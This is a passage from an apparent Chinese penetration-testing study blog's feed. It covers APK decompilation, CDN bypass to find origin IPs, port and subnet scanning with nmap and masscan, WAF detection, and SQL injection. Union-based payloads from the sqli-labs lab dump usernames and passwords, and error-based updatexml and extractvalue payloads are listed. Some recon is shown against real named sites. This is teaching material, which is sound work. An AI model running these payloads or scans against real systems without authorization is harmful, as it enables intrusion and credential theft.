class="line">相关测试命令：</span><br><span class="line"><span class="number">1.</span>python app.py android -i xxx.apk</span><br><span class="line"><span class="number">2.</span>针对其他应用，可以选择查看readme文件</span><br></pre></td></tr></table></figure><p>如下我们针对某瑟瑟软件进行资产提取</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515151101560.png" alt="image-20240515151101560"></p><p>很不幸，这个apk被加壳了，接下来我们介绍什么叫加壳</p><h3 id="壳（shell）是什么？"><a href="#壳（shell）是什么？" class="headerlink" title="壳（shell）是什么？"></a>壳（shell）是什么？</h3><p><strong>开发者为了防止逆向（反编译）和破解和抓包对app加的保护层（壳）</strong>，一般大型项目的app会加壳如淘宝，小型项目app一般不加如应用宝。</p><p>加了壳的app，运行时可能会检测https证书，如果我们用fd抓包，被检测的是fd证书，触发app的自我保护导致抓不了包，可以借助 Xposed框架&amp;JustTrustMe框架突破app检测证书的这层防御。</p><p>我们可以通过查壳的工具来查看是否加壳（<code>ApkScan-PKID.jar</code>），我们查另外一个应用</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515161456261.png" alt="image-20240515161456261"></p><p>这显示的是未被加壳的，对于加壳的应用，我们需要脱壳/砸壳进行扫描，我们可以使用相应的框架进行破壳，这些在之后再叙述，在此不做赘述</p><p>我们先对这个未被加壳的apk进行资源提取，这个软件叫金三角</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515161914684.png" alt="image-20240515161914684"></p><p>提取的过程如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515162012380.png" alt="image-20240515162012380"></p><p>反编译后的文件放在<code>AppInfoScanner/out/xxx</code>下，文件可以放在IDEA中查看</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515162142398.png" alt="image-20240515162142398"></p><p>我们可以看看爆出来的URL有什么东西，首先登场的是<code>https://clsp.fun/</code>，呵呵，懂的都懂好吧，只能夸克访问</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515162446191.png" alt="image-20240515162446191"></p><h2 id="APP内在提取-安卓修改大师"><a href="#APP内在提取-安卓修改大师" class="headerlink" title="APP内在提取-安卓修改大师"></a>APP内在提取-安卓修改大师</h2><p>安卓修改大师是一个集成化工具，可以在里面实现反编译，并修改对应的代码，然后直接编译成自己的软件，还是挺香的</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515182355474.png" alt="image-20240515182355474"></p><p>后期可以去整一个超级vip，那就更香了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515183002491.png" alt="image-20240515183002491"></p><p>在安卓修改大师上，你可以修改包名，更换图标，修改布局，改变软件内的图片，高级一点的，你可以修改项目源码，改变部分功能，随心所欲</p><p><strong>当然，使用安卓大师的最好的一点是可以很轻松的打包二次开发的APP，因为打包需要签名，对于一些逆向工具来说，不具有打包的功能，而安卓修改大师可以很轻易的做到这一点</strong></p><h2 id="APP外在抓包-Fiddler-amp-Burp"><a href="#APP外在抓包-Fiddler-amp-Burp" class="headerlink" title="APP外在抓包-Fiddler&amp;Burp"></a>APP外在抓包-Fiddler&amp;Burp</h2><p>前面的抓包过程中对这几个抓包工具做过细致的说明，在这里就不再赘述</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20def7942674282277c380-4.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20def7942674282277c356-5.png" alt="第10天：信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取"></p><p>对于某操作过程进行抓包得到url相对于内部提取来说，没有办法一次性拿到那么多URL，但是优点在于拿到的信息更为详细，内在提取的都是url，没有显示IP，而抓包可以得到IP、数据包的Server等信息</p><p>并且有些资产并不是内部提取这种静态提取法能得到的，有些东西必须通过抓包来进行分析，我们进行渗透的时候也要考虑的全一些</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反编译 </tag>
            
            <tag> 资产提取 </tag>
            
            <tag> 抓包封包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点-几种常见的CDN绕过方式</title>
      <link href="/post/8fc46e55.html"/>
      <url>/post/8fc46e55.html</url>
      
        <content type="html"><![CDATA[<h2 id="CDN前置知识"><a href="#CDN前置知识" class="headerlink" title="CDN前置知识"></a>CDN前置知识</h2><h3 id="工作原理及阻碍"><a href="#工作原理及阻碍" class="headerlink" title="工作原理及阻碍"></a>工作原理及阻碍</h3><p>CDN：Content Delivery Network，内容分发网络，其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输得更快、更稳定，通俗来说，就是在自己主机和服务器之间找一个就近点，这个就近点存储着服务器的访问资源，相当于缓存，在访问服务器时会定向到临近主机，以加快访问速度</p><p>CDN阻碍：在进行渗透测试的时候可能测试的是一个CDN节点服务器，无法获取真实服务器的数据</p><h3 id="CDN配置"><a href="#CDN配置" class="headerlink" title="CDN配置"></a>CDN配置</h3><p>加速域名：当某IP地址下的某个域名被加速，那么当用户访问该域名时，它就是被加速访问的，对于其他子域名，就不是加速访问的</p><p>业务类型：服务器中被加速的资源。分为页面加速、大文件下载加速，视频点播加速和全站加速；当选择特定的加速服务时，我们可以通过访问其他未被加速的资源，来找到真实的IP地址</p><p>加速区域：指定区域进行加速，加速效果只在区域内有效，阿里云有中国境内加速，全球加速，全球加速（除中国境内）三种加速区域</p><h3 id="CDN类型"><a href="#CDN类型" class="headerlink" title="CDN类型"></a>CDN类型</h3><p>1.传统访问：用户访问域名—-&gt;解析服务器IP—-&gt;访问目标主机</p><p>2.普通CDN：用户访问域名—-&gt;CDN节点—-&gt;真实服务器IP—-&gt;访问目标主机</p><p>3.带WAF的CDN：用户访问域名—-&gt;CDN结点（WAF）—-&gt;真实服务器IP—-&gt;访问目标主机</p><h2 id="CDN绕过方式"><a href="#CDN绕过方式" class="headerlink" title="CDN绕过方式"></a>CDN绕过方式</h2><h3 id="phpinfo泄露"><a href="#phpinfo泄露" class="headerlink" title="phpinfo泄露"></a>phpinfo泄露</h3><p><strong>在域名后面直接加<code>/phpinfo.php</code></strong>，如果存在该php文件，它会显示服务器的一些配置信息，包括IP地址。需要注意的是，<code>phpinfo.php</code>中的IP地址是主机本地的IP地址，也就是说可能是内网IP，也可能是外网IP，也不排除目标主机有多个网卡</p><h3 id="利用漏洞绕过CDN-例如SSRF漏洞"><a href="#利用漏洞绕过CDN-例如SSRF漏洞" class="headerlink" title="利用漏洞绕过CDN(例如SSRF漏洞)"></a>利用漏洞绕过CDN(例如SSRF漏洞)</h3><p>该方法利用网站的SSRF漏洞，利用服务器的漏洞去访问我们设置好的资源，让服务器对我们进行一个主动连接。以获取真实的IP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SSRF漏洞简介</span><br><span class="line">ssrf（服务器端请求伪造）是一种由攻击者构造形成，由服务端发起请求的安全漏洞，攻击目标通常是从外网无妨访问到内部系统的服务器。正是因为是由服务器发起的，所以它能够请求到与它相连而与外网隔离的内部系统</span><br></pre></td></tr></table></figure><p>相关案例：利用SSRF漏洞获取真实IP</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514132013468.png" alt="image-20240514132013468"></p><p>让目标服务器访问我们的网站，并在自己的服务器上进行监听</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514132054703.png" alt="image-20240514132054703"></p><p>点击提交后，自己的服务器可以监听到相关请求</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514132159837.png" alt="image-20240514132159837"></p><p>获取的<code>47.75.212.155</code>即为我们想要获得的真实IP</p><h3 id="利用子域名"><a href="#利用子域名" class="headerlink" title="利用子域名"></a>利用子域名</h3><p>某些企业业务线比较多，有些站点的主站甚至部分域名使用了CDN加速，但是一些子域名并未使用加速服务，那么就可以通过子域名去获取目标的真实IP</p><p>以下是相关真实案例：<code>www.sp910.com</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514130209088.png" alt="image-20240514130209088"></p><p>先使用超级ping来查询是否存在CDN</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514130348584.png" alt="image-20240514130348584"></p><p>很显然，是开启了CDN加速服务的，在设置CDN的时候，如果加速域名设置了<code>www.xxx.com</code>，就会只对该域名加速，如果设置的是<code>*.xxx.com</code>，那么所有<code>xxx.com</code>下的子域名都会被加速，对于这个案例，我们可以验证一下<code>sp910.com</code>，看是否对该子域名进行了加速</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514131055382.png" alt="image-20240514131055382"></p><p>我们可以看到，所有的ip地址都一样，所以<code>sp910.com</code>并没有被加速，且<code>203.107.44.133</code>为该网站的真实IP</p><h3 id="接口国外访问"><a href="#接口国外访问" class="headerlink" title="接口国外访问"></a>接口国外访问</h3><p>针对某些网站开了CDN服务，但是只开了中国内地加速，这个时候可以选择通过国外的接口网站进行访问，可以查到真实的IP</p><p>相关案例：<code>www.xuexila.com</code>，依旧进行超级ping，观察是否有CDN</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514133903246.png" alt="image-20240514133903246"></p><p>从结果观察，是存在CDN的，这个时候我们找一个国外结点进行访问（最后找非洲不知名国家，一般的都不会在那里开CDN加速服务）</p><p>国外访问地址：<a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业精准的IP库服务商_IPIP</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514135447052.png" alt="image-20240514135447052"></p><p><strong>注意，测试出来的不一定真的为真实IP，还需要综合社工进行判断，所有的方法测出来的都不一定完全正确</strong></p><p><strong>还有一种比较抽象的方法，这个网站可以直接返回真实IP，但是不保真，可以拿来做验证，<a href="https://get-site-ip.com/">Get Site IP - Find IP Address and location from any URL (get-site-ip.com)</a></strong></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514144322780.png" alt="image-20240514144322780"></p><h3 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h3><p>通过网站的找回密码功能让服务器主动给我们发送相关邮件，我们通过邮件获取真实IP</p><p>相关案例：<code>www.mozhe.cn</code></p><p>通过找回密码，让服务器给我们发送相关邮件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514140018068.png" alt="image-20240514140018068"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514140358693.png" alt="image-20240514140358693"></p><p>点击显示原文，在原文中获取真实IP</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514140529382.png" alt="image-20240514140529382"></p><h3 id="全网段扫描-FuckCDN"><a href="#全网段扫描-FuckCDN" class="headerlink" title="全网段扫描-FuckCDN"></a>全网段扫描-FuckCDN</h3><p>工具下载：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p><p>我们仍然使用<code>www.xuexila.com</code>进行测试，首先先配置<code>set.ini</code>文件，将<code>FindUrl</code>改成我们需要测试的url，FindStr填写为网页关键字，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514141936631.png" alt="image-20240514141936631"></p><p>在<code>ip.txt</code>文件中配置ip地址的范围，通过百度搜索域名查询和备案信息 查询属于哪个平台，在通过平台查询IP范围（实在不知道可以直接<code>0.0.0.0 255.255.255.255</code>全网的扫描</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142622836.png" alt="image-20240514142622836"></p><p> 打开fuckcdn.exe并在Scan url出写入域名</p><p>通过本机的cmd获取本地访问该域名的ip地址并写入工具中，端口为80</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142752985.png" alt="image-20240514142752985"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142826986.png" alt="image-20240514142826986"></p><p>开始运行工具，如下图所示则表示运行成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142918230.png" alt="image-20240514142918230"></p><p>最后会生成一个result_ip的txt文件，里面存放着真实的IP地址</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514144605858.png" alt="image-20240514144605858"></p><p>还是好多，说明源主机可能不只一个（好歹是个运行了20年的大站）</p><h2 id="CDN绑定"><a href="#CDN绑定" class="headerlink" title="CDN绑定"></a>CDN绑定</h2><p>最后将获得的真实IP和我们的域名绑定在一起，以方便后面的渗透测试，使得我们进行访问域名的时候，不使用其提供的缓存，而是直接访问主机</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hosts地址: C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514145211552.png" alt="image-20240514145211552"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点-端口扫描&amp;WAF扫描&amp;负载均衡&amp;CDN服务</title>
      <link href="/post/8cfaf7f.html"/>
      <url>/post/8cfaf7f.html</url>
      
        <content type="html"><![CDATA[<h2 id="获取网络信息-服务厂商-amp-网络架构"><a href="#获取网络信息-服务厂商-amp-网络架构" class="headerlink" title="获取网络信息-服务厂商&amp;网络架构"></a>获取网络信息-服务厂商&amp;网络架构</h2><p>1.每个厂商的防护策略不同，获取到厂商信息可以第一时间知道目标服务器的防护情况</p><p>2.搞清楚是外网还是内网</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">下面是一个简单的例子，说明为什么搞清楚内外网很重要</span><br><span class="line">外网出口IP:<span class="number">196.128</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">内网:<span class="number">125.136</span><span class="number">.7</span><span class="number">.6</span></span><br><span class="line">内外<span class="number">125.136</span><span class="number">.7</span><span class="number">.6</span>可以直接访问外网，在交换机处做端口映射，流量给到<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">外网是探测不到内网的</span><br><span class="line">对于安全测试来说，如果进行端口扫描，只能扫描到外网流量出口，对于部署在内网的网站，会扫不到或者误报</span><br></pre></td></tr></table></figure><p>3.收集同一网段下其他资源信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">比如</span><br><span class="line">目标:<span class="number">171.40</span><span class="number">.78</span><span class="number">.83</span></span><br><span class="line">网段:<span class="number">171.40</span><span class="number">.78</span><span class="number">.1</span>-<span class="number">255</span></span><br><span class="line">可以收集该网段下WEB应用、FTP、SSH、redis等各种服务的信息</span><br><span class="line">如果已经拿到<span class="number">171.40</span><span class="number">.78</span><span class="number">.99</span>的服务器信息，与目标靶机处于同一网段，就可以进行内网攻击安全测试手段</span><br></pre></td></tr></table></figure><h2 id="服务信息获取-协议应用-amp-内网资产"><a href="#服务信息获取-协议应用-amp-内网资产" class="headerlink" title="服务信息获取-协议应用&amp;内网资产"></a>服务信息获取-协议应用&amp;内网资产</h2><h3 id="协议应用（端口扫描）"><a href="#协议应用（端口扫描）" class="headerlink" title="协议应用（端口扫描）"></a>协议应用（端口扫描）</h3><p>渗透测试常见开放端口及利用：<a href="https://www.cnblogs.com/iAmSoScArEd/p/10564262.html">渗透测试常见开放端口及利用 - 我超怕的 - 博客园 (cnblogs.com)</a></p><p>端口扫描工具：Nmap、Masscan</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">nmap www.xiaodi8.com -Pn --osscan-limit -sV  <span class="comment">#扫描端口、服务器等信息</span></span><br><span class="line">masscan -p1-<span class="number">65535</span> <span class="number">47.75</span><span class="number">.212</span><span class="number">.155</span>    <span class="comment">#扫描这个地址下的所有端口</span></span><br><span class="line">masscan -p80,<span class="number">21</span>,<span class="number">3306</span>,<span class="number">8888</span>,<span class="number">8080</span> <span class="number">47.75</span><span class="number">.212</span><span class="number">.0</span>/<span class="number">24</span>   <span class="comment">#扫描某网段下指定端口</span></span><br></pre></td></tr></table></figure><h3 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h3><p>同服务器下的不同WEB应用查询技术</p><p>例如，同一服务器171.40.78.83下有多个网站，<code>www.123.com、www.456.com、www.999.com</code></p><p>目标<code>www.123.com</code>没有什么安全测试头绪时，用旁注查询到该IP下还有其他域名，对其他域名试试能不能有突破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">旁注查询网站：</span><br><span class="line">https://chapangzhan.com/</span><br><span class="line">https://www.webscan.cc/</span><br><span class="line">http://stool.chinaz.com/same</span><br><span class="line">https://c.webscan.cc/</span><br></pre></td></tr></table></figure><h3 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h3><p>同网段下不同服务器IP下的WEB应用查询技术</p><p><code>171.40.78.83</code>下<code>www.123.com</code>或者其他应用都没有安全测试头绪的时候，就可以查询<code>171.40.78.1-255</code>所有网段下所涉及的所有协议服务</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C段在线查询：https://c.webscan.cc/</span><br></pre></td></tr></table></figure><p>kali查询c段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>masscan -p80,<span class="number">21</span>,<span class="number">3306</span>,<span class="number">8888</span>,<span class="number">8080</span> <span class="number">47.75</span><span class="number">.212</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"><span class="number">2.</span>IP反查，查询该网站域名</span><br><span class="line">IP反查工具：https://dns.aizhan.com/</span><br><span class="line"><span class="number">3.</span>进行内外渗透</span><br></pre></td></tr></table></figure><h2 id="阻碍信息获取-CDN-amp-WAF-amp-均衡负载-amp-防火墙"><a href="#阻碍信息获取-CDN-amp-WAF-amp-均衡负载-amp-防火墙" class="headerlink" title="阻碍信息获取-CDN&amp;WAF&amp;均衡负载&amp;防火墙"></a>阻碍信息获取-CDN&amp;WAF&amp;均衡负载&amp;防火墙</h2><h3 id="CDN服务识别"><a href="#CDN服务识别" class="headerlink" title="CDN服务识别"></a>CDN服务识别</h3><p>在上一篇文字中介绍过CDN服务为什么会给我们的渗透带来阻碍，这里介绍一些识别方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">使用超级ping，在全国各地对这个地址进行访问</span><br><span class="line">如果全国各地访问的IP都不同，那么就开启了CDN服务</span><br><span class="line">如果全国各地访问的IP相同，那么未开启CDN服务</span><br></pre></td></tr></table></figure><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><p>1.看图识WAF</p><p>常见WAF拦截页面：<a href="https://www.cnblogs.com/charon1937/p/13799467.html">看图识WAF——搜集常见WAF拦截页面 - Charon·1937 - 博客园 (cnblogs.com)</a></p><p>2.脚本识别工具</p><p>利用kali的wafw00f工具识别</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240513134141311.png" alt="image-20240513134141311"></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>kali自带识别工具lbd</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240513134734972.png" alt="image-20240513134734972"></p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>防火墙与内网渗透的关系比较大，协议的入站/出战规则对端口扫描有限制</p><p><strong>nmap只可以识别默认的防火墙，对于有自装的防火墙识别不了</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口扫描 </tag>
            
            <tag> CDN </tag>
            
            <tag> WAF </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/post/e73517db.html"/>
      <url>/post/e73517db.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL（Structured Query Language)，结构化查询语言，例如</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name <span class="keyword">WHERE</span> a<span class="operator">=</span>xxx AND...</span><br><span class="line"><span class="keyword">UPDATE</span> tbl_name <span class="keyword">set</span> col_1 <span class="operator">=</span> <span class="string">&#x27;xx&#x27;</span> <span class="keyword">where</span> ...</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl_name ...</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240502215914729.png" alt="image-20240502215914729"></p><p><strong>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</strong></p><p>本质是把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</p><h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><p>按照注入方式的不同，我们可以将注入分为：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">联合查询：可以明确判断回显位置的时候使用（union select）</span><br><span class="line">报错注入：无回显位置，但是有报错输出的情况可以使用</span><br><span class="line">布尔盲注：关闭错误回显和数据回显，但是页面会根据我们的输入对错变化，可以使用布尔盲注</span><br><span class="line">时间盲注：无任何形式的回显，但是对睡眠函数sleep()有响应，可以使用时间盲注</span><br><span class="line">堆叠注入：堆叠注入在mysql上不常见，必须要用到mysqli<span class="emphasis">_multi_</span>query()或者PDO，可以用分号分隔执行多个语句，相当于直接连接数据库，Mssql常用堆叠注入</span><br></pre></td></tr></table></figure><p>按照注入点进行分类，有以下三种注入方式：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">数字型注入</span><br><span class="line">字符型注入</span><br><span class="line">搜索型注入</span><br></pre></td></tr></table></figure><h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>以下为对联合注入的高度概括</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.判断数据库字段数目</span></span><br><span class="line"><span class="string">&#x27;order by ?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#2.联合查询---接入1，2，3，4回显数据</span></span><br><span class="line"><span class="string">mysql&gt; select * from stu union select 1,2,3,4;</span></span><br><span class="line"><span class="string">+----+---------+--------+------+</span></span><br><span class="line"><span class="string">| id | name    | gender | age  |</span></span><br><span class="line"><span class="string">+----+---------+--------+------+</span></span><br><span class="line"><span class="string">|  1 | chengke |      1 |   30 |</span></span><br><span class="line"><span class="string">|  1 | beijing |      1 |  200 |</span></span><br><span class="line"><span class="string">|  2 | guagnxi |      1 | 2300 |</span></span><br><span class="line"><span class="string">|  3 | nanjing |      1 |  500 |</span></span><br><span class="line"><span class="string">|  4 | henan   |      1 |  600 |</span></span><br><span class="line"><span class="string">|  1 | 2       |      3 |    4 |</span></span><br><span class="line"><span class="string">+----+---------+--------+------+</span></span><br><span class="line"><span class="string">6 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#3.回显user--假设回显位置为2</span></span><br><span class="line"><span class="string">mysql&gt; select * from stu union select 1, user(),3,4;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#4.回显数据库</span></span><br><span class="line"><span class="string">mysql&gt; select * from stu union select 1, database(),3,4;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#5.回显版本号</span></span><br><span class="line"><span class="string">mysql&gt; select * from stu union select 1,version(),3,4;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#6.查询表名</span></span><br><span class="line"><span class="string">mysql&gt; select * from stu union select 1, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>testdb<span class="string">&#x27;,3,4;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#7.查询字段信息</span></span><br><span class="line"><span class="string">mysql&gt; select * from stu union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>testdb<span class="string">&#x27; and table_name=&#x27;</span>stu<span class="string">&#x27;,3,4;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#8.锁定目标信息</span></span><br><span class="line"><span class="string">select * from stu union select 1,select group_concat(name,age) from stu,3,4;</span></span><br></pre></td></tr></table></figure><p>下面以sqli-lab第一关为例子，首先打开第一关是下面这种情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202107350.png" alt="image-20240709202107350"></p><p>首先这里让我们输入id为参数，那我们就输入一个<code>?id=1</code>看看会给我们返回什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202418639.png" alt="image-20240709202418639"></p><p>很好，接下来我们就要判断是否存在注入了，首先输入<code>?id=1&#39;</code>，看看是否会报错</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202716109.png" alt="image-20240709202716109"></p><p>很显然，报错了，那我们就继续输入<code>?id=1&#39;--+</code>，看一看是否会正常，如果正常了，则代表存在注入点，且为字符型注入（—+在数据库中代表注释符）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202913982.png" alt="image-20240709202913982"></p><p>从这里，我们可以发现属于字符型注入，接下来我们用<code>order by</code>看看存在几个字段</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709203131333.png" alt="image-20240709203131333"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709203146964.png" alt="image-20240709203146964"></p><p>所以字段数为3，接下来我们用联合注入进行爆出相关的数据库信息以及数据库版本<code>?id=-1&#39; union select 1,version(),database()--+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709203425482.png" alt="image-20240709203425482"></p><p>大于5.0版本，可以使用information_schema，且数据库名称为security，所以接下来我们使用注入语句进行注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709204128138.png" alt="image-20240709204128138"></p><p>我们所需要的表名为users，所以使用users进行查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709204258190.png" alt="image-20240709204258190"></p><p>我们的敏感信息已经出现了，我们进行最后一步操作，爆出相关信息即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,group_concat(id,username,password) from users --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709204643937.png" alt="image-20240709204643937"></p><p>成功写出这道题，至此大家应该也了解了联合注入的基本流程，但是想要搞清楚字符型和数字型的区别，还得自己动手去做才能有更多的体会</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入的应用场景就是当前页面存在注入点，但是没有任何数据回显的位置，这个时候使用联合注入是带不出任何数据的，但是又没有对数据库的报错信息进行屏蔽，这个时候我们就可以利用一些报错函数进行数据的读取</p><h4 id="常见的报错函数"><a href="#常见的报错函数" class="headerlink" title="常见的报错函数"></a>常见的报错函数</h4><p>1.updatexml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,1,1) 一共接收三个参数，报错位置在第二个参数</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>2.extractvalue</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,1) 一共接收两个参数，报错位置在第二个参数</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat((select user()))) --+</span><br></pre></td></tr></table></figure><p>3.ST_LatFromGeoHash() (mysql&gt;=5.7.x)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e)) --+</span><br></pre></td></tr></table></figure><p>4.ST_LongFromGeoHash() (mysql&gt;=5.7.x)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure><p>我们在使用很多报错函数进行数据回显的时候，往往会遇到字符长度的限制问题，此时我们想要使用group_concat函数进行单行输出是输出不完的，会限制输出数量在32字节</p><p><img 